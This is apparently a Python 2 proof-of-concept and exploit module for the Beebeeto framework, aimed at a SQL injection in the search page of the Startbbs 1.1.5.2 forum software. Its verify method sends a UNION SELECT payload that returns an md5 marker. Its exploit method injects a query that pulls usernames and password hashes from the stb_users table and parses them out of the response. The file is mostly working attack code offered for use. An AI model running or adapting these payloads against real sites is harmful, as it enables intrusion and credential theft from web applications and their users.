#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0196',
            'name': 'Startbbs 1.1.5.2 /themes/default/search.php SQL注入漏洞 POC & Exploit',
            'author': '小马甲',
            'create_date': '2014-12-10',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Startbbs',
            'vul_version': ['1.1.5.2'],
            'type': 'SQL Injection',
            'tag': ['Startbbs漏洞', 'SQL注入漏洞', '/themes/default/search.php', 'php'],
            'desc': 'N/A',
            'references': ['http://wooyun.org/bugs/wooyun-2014-067853',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = ("/index.php/home/search?q=1%27union%20select%201,2,3,4,"
                   "md5(666),6,7,8,9,0,1,2,3,4,5,6,7--%20&sitesearch=http%3A%2F%2F127.0.0.1%2Fstartbbs%2F")
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        content = urllib2.urlopen(req).read()
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        if 'fae0b27c451c728867a567e8c1bb4e53' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args


    @classmethod
    def exploit(cls, args):
        payload = ("/index.php/home/search?q=1%27union%20select%201,2,3,4,"
                   "concat(%27~%27,username,md5(3.1416),password,%27~%27),6,7,8,9,0,1"
                   ",2,3,4,5,6,7%20from%20stb_users--%20&sitesearch=http%3A%2F%2F127.0.0.1%2Fstartbbs%2F")
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        content = urllib2.urlopen(req).read()
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        match = re.search('~(.*?)d4d7a6b8b3ed8ed86db2ef2cd728d8ec(.*?)~', content)
        if match:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            args['poc_ret']['Username'] = match.group(1)
            args['poc_ret']['Password'] = match.group(2)
        return args


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())